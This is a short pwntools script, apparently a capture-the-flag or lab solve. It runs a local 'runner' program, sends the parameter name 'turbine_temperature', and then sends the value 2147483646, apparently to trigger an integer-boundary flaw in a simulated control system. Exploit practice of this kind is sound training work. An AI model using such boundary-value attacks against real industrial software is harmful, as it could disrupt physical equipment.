#!/usr/bin/python3

from pwn import *
import os

env = os.environ.copy()
env['LD_LIBRARY_PATH'] = './runner/external/'
p = process(['./runner/run.sh'], env=env)
p.recv(numb=100, timeout=1.0)
p.sendline(b'turbine_temperature')
p.recv(timeout=1.0)
p.sendline(b'2147483646')
print(p.clean().decode(errors='ignore'))